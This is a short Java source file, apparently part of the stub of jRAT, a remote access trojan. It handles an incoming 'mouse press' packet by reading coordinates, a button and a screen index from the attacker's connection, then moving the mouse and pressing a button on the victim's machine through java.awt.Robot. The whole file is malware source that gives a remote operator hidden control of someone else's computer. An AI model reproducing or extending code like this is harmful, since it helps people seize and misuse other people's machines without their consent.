package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Main;

public class Packet92MousePress extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int x = Connection.instance.readInt();
		int y = Connection.instance.readInt();
		int btn = Connection.instance.readInt();
		int i = Connection.instance.readInt();
		if (i == -1) {
			Main.robot.mouseMove(x, y);
			Main.robot.mousePress(btn);
		} else {
			Main.robots[i].mouseMove(x, y);
			Main.robots[i].mousePress(btn);
		}
	}

}
